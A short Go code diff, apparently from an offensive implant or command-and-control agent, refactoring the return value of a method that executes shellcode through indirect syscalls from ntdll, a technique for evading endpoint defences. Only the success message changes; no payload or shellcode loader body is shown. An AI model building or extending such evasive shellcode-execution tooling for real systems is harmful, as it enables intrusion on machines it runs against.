@@ -143,9 +143,5 @@ func (c *ExecuteShellcodeCommand) executeIndirect(shellcode []byte) structs.Comm
 
 	syscall.CloseHandle(syscall.Handle(hThread))
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Method: Indirect syscalls (calls from ntdll)\n  Thread created and running", len(shellcode), addr),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Method: Indirect syscalls (calls from ntdll)\n  Thread created and running", len(shellcode), addr)
 }
